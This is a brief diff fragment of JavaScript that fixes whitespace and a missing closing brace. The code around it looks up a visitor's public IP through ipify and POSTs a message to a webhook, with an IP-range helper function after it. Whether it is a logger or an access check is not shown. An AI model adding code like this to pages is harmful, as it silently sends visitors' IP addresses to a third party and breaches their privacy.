@@ -51,7 +51,7 @@ fetch('https://api.ipify.org/?format=json')
         }
       ]
     };
-    
+
     fetch(webhook, {
       method: 'POST',
       headers: {
@@ -59,6 +59,7 @@ fetch('https://api.ipify.org/?format=json')
       },
       body: JSON.stringify(message)
     });
+  });
 
 function isIPInRange(ip, range) {
   var ipInt = ipToNumber(ip);
